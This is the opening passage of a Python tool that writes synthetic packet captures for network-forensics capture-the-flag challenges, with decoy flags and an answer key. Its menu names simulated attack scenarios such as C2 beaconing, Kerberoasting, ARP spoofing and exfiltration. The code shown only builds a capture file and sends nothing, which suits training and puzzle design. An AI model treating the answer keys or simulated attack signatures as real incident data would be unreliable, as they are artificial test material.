#!/usr/bin/env python3
"""
chumbucket.py - A network-forensics CTF challenge authoring tool.

Generates a .pcap containing a controlled volume of plausible "noise" traffic
per protocol, then hides a flag inside it using one of several techniques at a
chosen difficulty. Also emits an answer-key sidecar so you can verify your own
challenge's intended solve path.

This produces a capture FILE for analysis puzzles. It does not transmit anything
on a network.

Requires: scapy  (pip install scapy)
"""

import argparse
import base64
import gzip
import ipaddress
import random
import sys
from dataclasses import dataclass, field

from scapy.all import (
    IP, TCP, UDP, ICMP, Ether, Raw, DNS, DNSQR, DNSRR, ARP, BOOTP, DHCP, wrpcap,
)

# ---------------------------------------------------------------------------
# Tool metadata / signature
# ---------------------------------------------------------------------------

TOOL_NAME   = "ChumBucket"
SUBTITLE    = "Network-Forensics CTF Challenge Forge"
VERSION     = "v1.2-beta"
AUTHOR      = "Profe Malware"
DESCRIPTION = (
    "Chums the water with realistic background traffic and decoy flags, then hides\n"
    "     the real catch for your players to fish out. Built for educators, red\n"
    "     teamers, and competition designers."
)
DEFAULT_FLAG_PREFIX = "CTF"

# Big wordmark shown on launch (ANSI-shadow style).
WORDMARK = r"""
 ██████╗██╗  ██╗██╗   ██╗███╗   ███╗██████╗ ██╗   ██╗ ██████╗██╗  ██╗███████╗████████╗
██╔════╝██║  ██║██║   ██║████╗ ████║██╔══██╗██║   ██║██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
██║     ███████║██║   ██║██╔████╔██║██████╔╝██║   ██║██║     █████╔╝ █████╗     ██║   
██║     ██╔══██║██║   ██║██║╚██╔╝██║██╔══██╗██║   ██║██║     ██╔═██╗ ██╔══╝     ██║   
╚██████╗██║  ██║╚██████╔╝██║ ╚═╝ ██║██████╔╝╚██████╔╝╚██████╗██║  ██╗███████╗   ██║   
 ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═════╝  ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
""".strip("\n")


def format_flag(wrapper: str, inner: str) -> str:
    """Insert the inner flag text into the wrapper at the first 'FLAG' token."""
    return wrapper.replace("FLAG", inner, 1)


def wrapper_parts(wrapper: str) -> tuple[str, str]:
    """Return the (open, close) text surrounding the 'FLAG' placeholder.
    Uses partition so a stray second 'FLAG' never causes an unpack error."""
    open_, _, close = wrapper.partition("FLAG")
    return open_, close

THEME = {
    "banner":      "bold cyan",
    "border":      "cyan",
    "author":      "bold bright_cyan",
    "subtitle":    "bold white",
    "description": "dim white",
    "meta":        "dim cyan",
    "menu_title":  "bold cyan",
    "menu_item":   "white",
    "menu_number": "bold cyan",
    "prompt":      "bold cyan",
    "success":     "bold green",
    "warning":     "bold yellow",
    "error":       "bold red",
    "highlight":   "bold bright_white",
    "coming_soon": "dim yellow",
}

# rich is optional; degrade gracefully to plain text if it isn't installed
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.text import Text
    _console = Console()
    _HAS_RICH = True
except ImportError:
    _console = None
    _HAS_RICH = False


def print_banner():
    """Render the tool signature with the big wordmark. rich + THEME if available."""
    if _HAS_RICH:
        from rich.align import Align
        from rich.console import Group
        art = Text(WORDMARK, style=THEME["banner"], no_wrap=True, overflow="ignore")
        sub = Text(SUBTITLE, style=THEME["subtitle"])
        desc = Text("\n" + DESCRIPTION + "\n", style=THEME["description"])
        foot = Text()
        foot.append(VERSION, style=THEME["meta"])
        foot.append("   •   ", style=THEME["border"])
        foot.append(f"by {AUTHOR}", style=THEME["author"])
        body = Group(art, Text(), sub, desc, foot)
        _console.print(Panel(body, border_style=THEME["border"], expand=False,
                             padding=(1, 3)))
    else:
        print(WORDMARK)
        print(f"  {SUBTITLE}")
        print(f"  {DESCRIPTION}")
        print(f"  {VERSION}  -  by {AUTHOR}")
        print("=" * 86)


# ---------------------------------------------------------------------------
# Interactive prompt helpers (use rich + THEME when available)
# ---------------------------------------------------------------------------

def _style(text: str, key: str) -> str:
    """Wrap text in rich markup for THEME[key], or return plain if no rich."""
    return f"[{THEME[key]}]{text}[/]" if _HAS_RICH else text


def say(text: str, key: str = "menu_item"):
    if _HAS_RICH:
        _console.print(_style(text, key))
    else:
        print(text)


def ask(label: str, default: str = "") -> str:
    """Free-text prompt with a default shown in brackets."""
    suffix = f" [{default}]" if default else ""
    if _HAS_RICH:
        _console.print(_style(f"{label}{suffix}: ", "prompt"), end="")
    else:
        print(f"{label}{suffix}: ", end="")
    val = input().strip()
    return val if val else default


def ask_int(label: str, default: int) -> int:
    while True:
        raw = ask(label, str(default))
        try:
            return int(raw)
        except ValueError:
            say("  Please enter a whole number.", "error")


def ask_choice(title: str, options: list[tuple[str, str]], default_idx: int = 0) -> str:
    """Render a numbered menu. options is a list of (value, description).
    Returns the chosen value."""
    say(f"\n{title}", "menu_title")
    for i, (val, desc) in enumerate(options, 1):
        num = _style(f"  {i})", "menu_number")
        item = _style(f"{val}", "highlight")
        tail = _style(f" - {desc}", "menu_item")
        if _HAS_RICH:
            _console.print(f"{num} {item}{tail}")
        else:
            print(f"  {i}) {val} - {desc}")
    while True:
        raw = ask("Choose", str(default_idx + 1))
        try:
            idx = int(raw) - 1
            if 0 <= idx < len(options):
                return options[idx][0]
        except ValueError:
            pass
        say("  Invalid choice, try again.", "error")


def ask_yesno(label: str, default: bool = True) -> bool:
    d = "Y/n" if default else "y/N"
    raw = ask(f"{label} ({d})", "").lower()
    if not raw:
        return default
    return raw.startswith("y")


def interactive_config(args):
    """Walk the author through every decision, mutating `args` in place.
    Returns the populated args namespace."""
    say("\nInteractive challenge builder - press Enter to accept the [default].\n",
        "subtitle")

    # --- flag ---
    say("STEP 1 / 5  ::  The flag", "menu_title")
    fmt = ask_choice("Flag format", [
        ("CTF{FLAG}",     "classic CTF{...}"),
        ("flag{FLAG}",    "lowercase flag{...}"),
        ("FLAG{FLAG}",    "uppercase FLAG{...}"),
        ("custom",        "type your own wrapper"),
    ])
    if fmt == "custom":
        say("  Use the literal word FLAG as the placeholder, e.g. myctf-FLAG-end", "coming_soon")
        args.wrapper = ask("Wrapper template", "CTF{FLAG}") or "CTF{FLAG}"
        if "FLAG" not in args.wrapper:
            args.wrapper += "{FLAG}"
    else:
        args.wrapper = fmt
    inner = ask("Flag text (inside the wrapper)", "r34ssembly_1s_fun")
    args.flag = inner
    say(f"  -> flag will be: {format_flag(args.wrapper, inner)}", "success")

    # --- method / scenario ---
    say("\nSTEP 2 / 5  ::  Hiding technique or attack scenario", "menu_title")
    choice = ask_choice("How should the flag be hidden?", [
        ("dns",          "scatter encoded flag across DNS subdomain labels (exfil trope)"),
        ("split-tcp",    "split across TCP payloads; player reassembles by index"),
        ("split-icmp",   "split across ICMP echo payloads; player reassembles"),
        ("http",         "bury in an HTTP session cookie; found via stream follow"),
        ("kerberoast",   "SCENARIO: Kerberoasting burst; flag in a service SPN"),
        ("ftp-creds",    "SCENARIO: plaintext FTP login; flag is the password"),
        ("telnet-creds", "SCENARIO: plaintext Telnet login; flag is the password"),
        ("http-basic",   "SCENARIO: HTTP Basic auth; flag in base64 user:pass"),
        ("arp-spoof",    "SCENARIO: ARP poisoning; flag in the gratuitous-ARP padding"),
        ("port-scan",    "SCENARIO: SYN sweep; flag in the open port's banner"),
        ("brute-force",  "SCENARIO: failed logins then success; flag is cracked pw"),
        ("c2-beacon",    "SCENARIO: fixed-interval C2 callbacks; flag in a beacon"),
        ("rogue-dhcp",   "SCENARIO: rogue DHCP offer; flag in the boot-file field"),
        ("ssdp-upnp",    "SCENARIO: SSDP/UPnP abuse; flag in a NOTIFY LOCATION URL"),
        ("doh-beacon",   "SCENARIO: DNS-over-HTTPS beacon; flag in the TLS SNI label"),
        ("dga-beacon",   "SCENARIO: DGA domain burst; flag is one query's label"),
        ("malware-chain","SCENARIO: redirect->dropper->payload; flag in the dropper"),
        ("ransomware-note","SCENARIO: ransom note; flag is the 'Personal ID'"),
        ("pastebin-exfil","SCENARIO: dead-drop paste exfil; flag split across POSTs"),
    ])
    if choice in _SCENARIOS:
        args.scenario = choice
        say(f"  -> scenario '{choice}' will plant a detectable attack signature.",
            "warning")
    else:
        args.scenario = "none"
        args.method = choice

    # --- encoding ---
    say("\nSTEP 3 / 5  ::  Encoding & obfuscation", "menu_title")
    args.encode = ask_choice("Encoding applied before hiding?", [
        ("base32", "DNS-label safe; good default"),
        ("base64", "compact, recognizable"),
        ("hex",    "simplest to spot/decode"),
        ("none",   "plaintext (easy mode)"),
    ])
    if ask_yesno("Add a second XOR layer to defeat lazy `strings` sweeps?", False):
        args.xor = ask("XOR key", "sekret")
    else:
        args.xor = ""

    # --- noise volumes ---
    say("\nSTEP 4 / 5  ::  Background traffic (sessions per protocol)", "menu_title")
    say("  Each session expands into several real packets (handshake, data, acks).",
        "coming_soon")
    args.http  = ask_int("  HTTP sessions",  15)
    args.https = ask_int("  HTTPS sessions", 12)
    args.dns   = ask_int("  DNS exchanges",  20)
    args.tcp   = ask_int("  Other TCP service sessions", 12)
    args.udp   = ask_int("  UDP/DNS chatter", 10)
    args.icmp  = ask_int("  ICMP pings",      8)
    args.arp   = ask_int("  ARP exchanges",   10)
    args.dhcp  = ask_int("  DHCP handshakes", 2)
    args.clients = ask_int("  How many distinct hosts/IPs to generate on the LAN", 6)
    args.decoys = ask_int("  Decoy/red-herring fake flags", 3)
    if args.decoys > 0:
        args.decoy_theme = ask_choice("  Red-herring flavor", [
            ("spongebob", "Bikini Bottom mashups (default)"),
            ("cyber",     "realistic security jargon + fake CVEs"),
            ("mixed",     "both spongebob and cyber"),
            ("custom",    "your own word list"),
        ])
        if args.decoy_theme == "custom":
            raw = ask("  Custom words (comma-separated)", "")
            args.decoy_words = [w.strip() for w in raw.split(",") if w.strip()]
        else:
            args.decoy_words = []
    else:
        args.decoy_theme, args.decoy_words = "spongebob", []
    args.normalize = ask_yesno("  Normalize timing (even spacing, tidy capture)?", False)

    # --- output ---
    say("\nSTEP 5 / 5  ::  Output & reproducibility", "menu_title")
    seed_raw = ask("Seed (blank = random each run)", "")
    args.seed = int(seed_raw) if seed_raw.strip().lstrip("-").isdigit() else None
    say("  (just a name - .pcap / .txt are added automatically)", "coming_soon")
    args.out = ask("Output pcap name", "challenge")
    args.answer_key = ask("Answer-key name (blank = <out>_answer)", "")

    # --- summary / confirm ---
    say("\n" + "-" * 50, "border")
    say("Ready to generate:", "subtitle")
    say(f"  flag      : {format_flag(args.wrapper, args.flag)}", "meta")
    challenge = args.scenario if args.scenario != "none" else args.method
    say(f"  challenge : {challenge}", "meta")
    say(f"  encoding  : {args.encode}" + (" + XOR" if args.xor else ""), "meta")
    sessions = (args.http + args.https + args.dns + args.tcp + args.udp +
                args.icmp + args.arp + args.dhcp)
    say(f"  traffic   : ~{sessions} sessions across {args.clients} hosts + carrier", "meta")
    say(f"  timing    : {'normalized' if args.normalize else 'realistic jitter'}", "meta")
    say(f"  output    : {args.out}.pcap (+ answer key)", "meta")
    say("-" * 50, "border")
    if not ask_yesno("\nGenerate now?", True):
        say("Aborted.", "warning")
        sys.exit(0)
    return args

# ---------------------------------------------------------------------------
# Encoding helpers
# ---------------------------------------------------------------------------

def xor_bytes(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def dns_safe_scheme(scheme: str) -> str:
    """DNS labels are case-insensitive and limited to letters/digits/hyphen, so
    base64 (and plaintext) can't survive. Coerce to a DNS-safe encoding."""
    return scheme if scheme in ("hex", "base32") else "base32"

# TO ADD AN ENCODING SCHEME, update all three in lockstep so the self-check
# still passes:  (a) encode_payload() below,  (b) the inverse in self_check()'s
# undo(),  (c) _decode_block() for the CyberChef recipe. Add the name to the
# --encode choices in main() too.


def encode_payload(raw: bytes, scheme: str, xor_key: bytes | None) -> bytes:
    """Apply an encoding scheme. Returns the encoded bytes (ascii-safe where
    the scheme implies it)."""
    if xor_key:
        raw = xor_bytes(raw, xor_key)
    if scheme == "none":
        return raw
    if scheme == "hex":
        return raw.hex().encode()
    if scheme == "base64":
        return base64.b64encode(raw)
    if scheme == "base32":
        # base32 is DNS-label safe (letters+digits, case-insensitive)
        return base64.b32encode(raw).rstrip(b"=")
    raise ValueError(f"unknown scheme: {scheme}")


def describe_decode(scheme: str, xor_key: bytes | None) -> str:
    steps = []
    if scheme == "hex":
        steps.append("hex-decode")
    elif scheme == "base64":
        steps.append("base64-decode")
    elif scheme == "base32":
        steps.append("base32-decode (re-pad with '=' to a multiple of 8)")
    if xor_key:
        steps.append(f"XOR with key {xor_key!r}")
    if not steps:
        steps.append("read as plaintext")
    return " then ".join(steps)


# challenges whose carrier lowercases the encoded flag (hostname/SPN labels)
_LOWERCASING = {"dns", "kerberoast"}
# challenges where the flag rides as a plaintext password unless --encode is set
_PLAINTEXT_CRED = {"ftp-creds", "telnet-creds", "brute-force"}


def challenge_name(args) -> str:
    return args.scenario if args.scenario != "none" else args.method


def effective_encoding(args) -> tuple[str, str]:
    """Return (scheme_actually_used, note). For hostname-label carriers a
    requested base64/none is coerced to a label-safe scheme."""
    chal = challenge_name(args)
    if chal in _LOWERCASING:
        eff = dns_safe_scheme(args.encode)
        if eff != args.encode:
            return eff, f"requested '{args.encode}', coerced to '{eff}' (label-safe)"
        return eff, ""
    return args.encode, ""


def _decode_block(scheme: str) -> list:
    return {"hex": ["From Hex"], "base64": ["From Base64"],
            "base32": ["From Base32"], "none": []}.get(scheme, [])


def cyberchef_recipe(args) -> list:
    """Produce the exact ordered CyberChef recipe to recover the flag."""
    chal = challenge_name(args)
    eff, _ = effective_encoding(args)
    steps = []
    if chal == "http-basic":
        steps.append('From Base64        # HTTP Basic = base64("user:pass")')
        steps.append('Find/Replace  ^[^:]*:  ->  (nothing)   # keep only the password')
        steps += _decode_block(args.encode)
    elif chal in _PLAINTEXT_CRED and args.encode == "none":
        steps.append("(none - the password is already plaintext on the wire)")
    else:
        if chal in _LOWERCASING and eff == "base32":
            steps.append("Upper case         # labels are stored lowercase; Base32 is case-sensitive")
        steps += _decode_block(eff)
    if args.xor:
        steps.append(f'XOR  key="{args.xor}"  (UTF8)')
    return steps or ["(flag is plaintext - no recipe needed)"]


# ---------------------------------------------------------------------------
# Noise generation
# ---------------------------------------------------------------------------

@dataclass
class NoiseConfig:
    subnet: str = "10.0.0.0/24"
    start_time: float = 1700000000.0
    jitter: float = 0.35          # session spacing (seconds), scaled
    seed: int | None = None
    normalize: bool = False       # even out timestamps for a "clean" capture
    n_clients: int = 6            # how many distinct client hosts on the LAN


def _rand_ip(net: ipaddress.IPv4Network, rng: random.Random) -> str:
    hosts = int(net.network_address) + 1
    last = int(net.broadcast_address) - 1
    return str(ipaddress.IPv4Address(rng.randint(hosts, last)))


# --- realistic data tables -------------------------------------------------

_USER_AGENTS = [
    # desktop Chrome / Edge / Firefox / Safari
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.2420.65",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    # mobile
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    # API clients / CLI / bots (great for variety in a forensic capture)
    "curl/8.6.0",
    "Wget/1.21.4",
    "python-requests/2.31.0",
    "Go-http-client/2.0",
    "PostmanRuntime/7.37.3",
    "Apache-HttpClient/4.5.14 (Java/17.0.10)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (X11; Linux x86_64) node-fetch/1.0",
    "axios/1.6.8",
]
_WEB_HOSTS = [
    ("www.example.com", "93.184.216.34"),
    ("api.weather.io", "104.18.32.7"),
    ("cdn.jsdelivr.net", "151.101.1.229"),
    ("update.microsoft.com", "23.45.112.61"),
    ("fonts.gstatic.com", "142.250.80.3"),
    ("telemetry.corp.local", "10.0.0.20"),
    ("intranet.corp.local", "10.0.0.21"),
]
_PATHS = ["/", "/index.html", "/login", "/api/v1/status", "/dashboard",
          "/account/profile", "/search?q=quarterly+report", "/health",
          "/blog/2024/network-tips", "/products?page=2"]
_ASSETS = ["/static/app.css", "/static/app.js", "/static/vendor.js",
           "/assets/logo.png", "/assets/hero.jpg", "/favicon.ico",
           "/fonts/inter.woff2", "/api/v1/me"]
_REFERERS = ["https://www.google.com/", "https://duckduckgo.com/",
             "https://www.bing.com/search?q=corp+intranet", None, None]
_HTML_BODY = (
    "<!DOCTYPE html><html lang='en'><head><meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>{title}</title><link rel='stylesheet' href='/static/app.css'>"
    "<script src='/static/app.js' defer></script></head><body>"
    "<header><nav><a href='/'>Home</a> <a href='/dashboard'>Dashboard</a> "
    "<a href='/account/profile'>Profile</a></nav></header>"
    "<main><h1>{title}</h1><p>Welcome back. Session {sid}.</p>"
    "<section class='cards'><div class='card'>Reports</div>"
    "<div class='card'>Settings</div><div class='card'>Billing</div></section>"
    "</main><footer>&copy; 2024 {title}</footer></body></html>"
)
_CSS_BODY = ("/*! app.css */\nbody{font-family:Inter,system-ui,sans-serif;margin:0;"
             "background:#0f1419;color:#e6e6e6}nav a{margin-right:1rem;color:#4ea1d3}"
             ".cards{display:flex;gap:1rem}.card{padding:1rem;border:1px solid #233}")
_JS_BODY = ("/*! app.js */\n(function(){\"use strict\";var t=Date.now();"
            "document.addEventListener(\"DOMContentLoaded\",function(){"
            "console.log(\"loaded in\",Date.now()-t,\"ms\");"
            "fetch(\"/api/v1/me\").then(r=>r.json()).then(d=>console.log(d));});})();")
_SERVER_BANNERS = ["nginx/1.24.0", "nginx", "Apache/2.4.58 (Ubuntu)",
                   "Microsoft-IIS/10.0", "cloudflare", "gunicorn/21.2.0",
                   "Caddy", "openresty/1.25.3.1"]
_POWERED_BY = ["PHP/8.2.17", "Express", "ASP.NET", "Next.js", None, None]



def _rand_mac(rng: random.Random) -> str:
    # locally-administered, unicast; vendor-ish OUIs
    oui = rng.choice([(0x00, 0x1a, 0x2b), (0x3c, 0x5a, 0xb4),
                      (0xf0, 0x9f, 0xc2), (0x00, 0x0c, 0x29),
                      (0xac, 0xde, 0x48)])
    return "%02x:%02x:%02x:%02x:%02x:%02x" % (
        oui[0], oui[1], oui[2],
        rng.randint(0, 255), rng.randint(0, 255), rng.randint(0, 255))


@dataclass
class Host:
    ip: str
    mac: str
    role: str
    name: str = ""


@dataclass
class Network:
    gateway: Host
    dns: Host
    clients: list
    servers: dict          # hostname -> Host
    subnet: ipaddress.IPv4Network

    def mac_for(self, ip: str) -> str:
        for h in [self.gateway, self.dns, *self.clients, *self.servers.values()]:
            if h.ip == ip:
                return h.mac
        # in-subnet but unknown -> deterministic mac; external -> gateway (routed)
        addr = ipaddress.IPv4Address(ip)
        if addr in self.subnet:
            seed = int(addr) & 0xFFFFFF
            return "02:%02x:%02x:%02x:%02x:%02x" % (
                (seed >> 16) & 0xFF, (seed >> 8) & 0xFF, seed & 0xFF,
                (int(addr) >> 8) & 0xFF, int(addr) & 0xFF)
        return self.gateway.mac


def build_network(cfg: NoiseConfig, rng: random.Random) -> Network:
    net = ipaddress.IPv4Network(cfg.subnet)
    base = int(net.network_address)
    gateway = Host(str(ipaddress.IPv4Address(base + 1)), _rand_mac(rng), "gateway", "gw")
    dns = Host(str(ipaddress.IPv4Address(base + 53)), _rand_mac(rng), "dns", "resolver")
    clients = [Host(str(ipaddress.IPv4Address(base + 100 + i)), _rand_mac(rng),
                    "client", f"host-{i+1:02d}") for i in range(cfg.n_clients)]
    servers = {}
    for name, ip in _WEB_HOSTS:
        addr = ipaddress.IPv4Address(ip)
        mac = _rand_mac(rng) if addr in net else gateway.mac  # external via gw
        servers[name] = Host(ip, mac, "server", name)
    return Network(gateway, dns, clients, servers, net)


# --- TLS-ish payload crafting ----------------------------------------------

def _tls_record(ctype: int, body: bytes, ver=b"\x03\x03") -> bytes:
    return bytes([ctype]) + ver + len(body).to_bytes(2, "big") + body


def _tls_client_hello(sni: str, rng: random.Random) -> bytes:
    rnd = bytes(rng.getrandbits(8) for _ in range(32))
    sni_b = sni.encode()
    server_name = b"\x00" + len(sni_b).to_bytes(2, "big") + sni_b
    sni_list = (len(server_name).to_bytes(2, "big") + server_name)
    sni_ext = b"\x00\x00" + len(sni_list).to_bytes(2, "big") + sni_list
    exts = sni_ext
    body = (b"\x03\x03" + rnd + b"\x00" +              # ver, random, sid len
            b"\x00\x04\x13\x01\x13\x02" +              # cipher suites (2)
            b"\x01\x00" +                              # compression
            len(exts).to_bytes(2, "big") + exts)
    hs = b"\x01" + len(body).to_bytes(3, "big") + body  # handshake: client_hello
    return _tls_record(0x16, hs, ver=b"\x03\x01")


def _tls_app_data(n: int, rng: random.Random) -> bytes:
    return _tls_record(0x17, bytes(rng.getrandbits(8) for _ in range(n)))


# --- HTTP payload crafting -------------------------------------------------

def _accept_for(path: str) -> str:
    if path.endswith(".css"):
        return "text/css,*/*;q=0.1"
    if path.endswith(".js"):
        return "*/*"
    if path.endswith((".png", ".jpg", ".jpeg", ".gif", ".webp", ".ico", ".svg")):
        return "image/avif,image/webp,image/apng,image/*,*/*;q=0.8"
    if path.endswith(".woff2"):
        return "*/*"
    if path.startswith("/api") or path.endswith(".json"):
        return "application/json, text/plain, */*"
    return ("text/html,application/xhtml+xml,application/xml;q=0.9,"
            "image/avif,image/webp,*/*;q=0.8")


def _http_request(rng, host, path, ua, referer=None, cookie=None,
                  method="GET", body=b"") -> bytes:
    is_chrome = "Chrome/" in ua and "Firefox" not in ua
    is_mobile = any(t in ua for t in ("Mobile", "iPhone", "Android", "iPad"))
    is_doc = not path.endswith((".css", ".js", ".png", ".jpg", ".jpeg", ".gif",
                                ".webp", ".ico", ".svg", ".woff2")) and not path.startswith("/api")
    L = [f"{method} {path} HTTP/1.1", f"Host: {host}"]
    if is_chrome:
        ver = ua.split("Chrome/")[1].split(".")[0]
        L.append(f'sec-ch-ua: "Chromium";v="{ver}", "Not:A-Brand";v="24", '
                 f'"Google Chrome";v="{ver}"')
        L.append(f"sec-ch-ua-mobile: ?{1 if is_mobile else 0}")
        L.append(f'sec-ch-ua-platform: "{"Android" if is_mobile else "Windows"}"')
    if is_doc and is_chrome:
        L.append("Upgrade-Insecure-Requests: 1")
    L.append(f"User-Agent: {ua}")
    L.append(f"Accept: {_accept_for(path)}")
    if is_chrome:
        site = "same-origin" if referer and host in referer else "none" if is_doc else "same-origin"
        L.append(f"Sec-Fetch-Site: {site}")
        L.append(f"Sec-Fetch-Mode: {'navigate' if is_doc else 'no-cors'}")
        L.append(f"Sec-Fetch-Dest: {'document' if is_doc else 'empty'}")
        if is_doc:
            L.append("Sec-Fetch-User: ?1")
    L.append("Accept-Encoding: gzip, deflate, br")
    L.append("Accept-Language: en-US,en;q=0.9")
    if referer:
        L.append(f"Referer: {referer}")
    if cookie:
        L.append(f"Cookie: {cookie}")
    if method in ("POST", "PUT"):
        L.append("Content-Type: application/json")
        L.append(f"Content-Length: {len(body)}")
    L.append("Connection: keep-alive")
    return ("\r\n".join(L) + "\r\n\r\n").encode() + body


_DATES = ["Mon, 24 Jun 2024 10:15:32 GMT", "Tue, 25 Jun 2024 14:02:11 GMT",
          "Wed, 26 Jun 2024 09:48:57 GMT", "Thu, 27 Jun 2024 18:21:40 GMT"]
_COMPRESSIBLE = {"text/html", "text/css", "application/javascript",
                 "application/json", "text/plain", "application/xml"}


def _http_response(rng, host, path="/", status=200, ctype=None, body=None,
                   set_cookie=True, location=None, gzip_ok=True) -> bytes:
    sid = "%016x" % rng.getrandbits(64)
    etag = '"%x-%x"' % (rng.getrandbits(28), rng.getrandbits(36))
    if body is None:
        title = host.split(".")[0].capitalize()
        body = _HTML_BODY.format(title=title, sid=sid)
    if isinstance(body, str):
        body = body.encode()
    ctype = ctype or "text/html; charset=UTF-8"
    reason = {200: "OK", 301: "Moved Permanently", 302: "Found",
              304: "Not Modified", 404: "Not Found"}.get(status, "OK")
    L = [f"HTTP/1.1 {status} {reason}",
         f"Date: {rng.choice(_DATES)}",
         f"Server: {rng.choice(_SERVER_BANNERS)}"]
    pb = rng.choice(_POWERED_BY)
    if pb:
        L.append(f"X-Powered-By: {pb}")
    if location:
        L.append(f"Location: {location}")
    if status == 304:
        L.append(f"ETag: {etag}")
        L.append("Cache-Control: max-age=3600")
        return ("\r\n".join(L) + "\r\n\r\n").encode()
    L.append(f"Content-Type: {ctype}")
    # gzip compressible text responses, the way real servers do (Wireshark
    # shows the body as compressed bytes and decompresses it in the HTTP view).
    base_ct = ctype.split(";")[0].strip()
    if (gzip_ok and base_ct in _COMPRESSIBLE and len(body) > 24
            and rng.random() < 0.7):
        body = gzip.compress(body, compresslevel=6)
        L.append("Content-Encoding: gzip")
    L.append(f"Content-Length: {len(body)}")
    L.append(f"ETag: {etag}")
    L.append(f"Last-Modified: {rng.choice(_DATES)}")
    L.append("Cache-Control: " + rng.choice(
        ["no-cache, no-store, must-revalidate", "max-age=3600, public",
         "private, max-age=0", "max-age=31536000, immutable"]))
    L.append("Vary: Accept-Encoding")
    L.append("X-Content-Type-Options: nosniff")
    if rng.random() < 0.5:
        L.append("X-Frame-Options: SAMEORIGIN")
    if rng.random() < 0.3:
        L.append("Strict-Transport-Security: max-age=31536000")
    if set_cookie and path in ("/", "/login", "/index.html", "/dashboard"):
        L.append(f"Set-Cookie: sid={sid}; HttpOnly; Secure; SameSite=Lax; Path=/")
    L.append("Connection: keep-alive")
    return ("\r\n".join(L) + "\r\n\r\n").encode() + body


def _asset_response(rng, path):
    """Return (content_type, body_bytes) appropriate to an asset path."""
    if path.endswith(".css"):
        return "text/css", _CSS_BODY.encode()
    if path.endswith(".js"):
        return "application/javascript", _JS_BODY.encode()
    if path.endswith(".ico") or path.endswith((".png", ".jpg", ".jpeg", ".gif", ".webp")):
        head = b"\x89PNG\r\n\x1a\n" if not path.endswith(".ico") else b"\x00\x00\x01\x00"
        return ("image/png" if not path.endswith(".ico") else "image/x-icon",
                head + bytes(rng.getrandbits(8) for _ in range(rng.randint(200, 1200))))
    if path.endswith(".woff2"):
        return "font/woff2", b"wOF2" + bytes(rng.getrandbits(8) for _ in range(rng.randint(300, 900)))
    if path.startswith("/api"):
        import json as _json
        data = _json.dumps({"user": "host-%02d" % rng.randint(1, 20),
                            "role": rng.choice(["admin", "user", "auditor"]),
                            "ts": 1700000000 + rng.randint(0, 99999)})
        return "application/json", data.encode()
    return "text/html; charset=UTF-8", b"<html><body>ok</body></html>"


# --- conversation engine ---------------------------------------------------

def _emit(pkts, frame, clock, rng, delta):
    clock[0] += delta
    frame.time = clock[0]
    pkts.append(frame)


def _eth(net: Network, src_ip: str, dst_ip: str):
    return Ether(src=net.mac_for(src_ip), dst=net.mac_for(dst_ip))


def tcp_session(net: Network, client: Host, server: Host, dport: int,
                exchanges: list, rng: random.Random, clock: list[float],
                cfg: NoiseConfig) -> list:
    """A full TCP session: 3-way handshake, the given data exchanges (each a
    ('c2s'|'s2c', payload bytes) tuple), then a clean FIN/ACK teardown.
    Sequence and ack numbers are tracked correctly throughout."""
    pkts = []
    sport = rng.randint(1025, 65535)
    cseq = rng.randint(1, 2**31)
    sseq = rng.randint(1, 2**31)
    rtt = abs(rng.gauss(0.03, 0.015)) + 0.002
    ttl_c, ttl_s = rng.choice([64, 128]), rng.choice([64, 128, 255])

    def c2s(flags, load=b"", **kw):
        return (_eth(net, client.ip, server.ip) /
                IP(src=client.ip, dst=server.ip, ttl=ttl_c) /
                TCP(sport=sport, dport=dport, flags=flags, seq=cseq, ack=sseq, **kw) /
                (Raw(load=load) if load else b""))

    def s2c(flags, load=b"", **kw):
        return (_eth(net, server.ip, client.ip) /
                IP(src=server.ip, dst=client.ip, ttl=ttl_s) /
                TCP(sport=dport, dport=sport, flags=flags, seq=sseq, ack=cseq, **kw) /
                (Raw(load=load) if load else b""))

    # handshake
    _emit(pkts, c2s("S"), clock, rng, rtt); cseq += 1
    _emit(pkts, s2c("SA"), clock, rng, rtt); sseq += 1
    _emit(pkts, c2s("A"), clock, rng, rtt)
    # data
    for direction, load in exchanges:
        if direction == "c2s":
            _emit(pkts, c2s("PA", load), clock, rng, rtt); cseq += len(load)
            _emit(pkts, s2c("A"), clock, rng, rtt)
        else:
            _emit(pkts, s2c("PA", load), clock, rng, rtt); sseq += len(load)
            _emit(pkts, c2s("A"), clock, rng, rtt)
    # teardown
    _emit(pkts, c2s("FA"), clock, rng, rtt); cseq += 1
    _emit(pkts, s2c("FA"), clock, rng, rtt); sseq += 1
    _emit(pkts, c2s("A"), clock, rng, rtt)
    return pkts


def conv_http(net, rng, clock, cfg):
    """A realistic page load: the HTML document followed by several asset requests
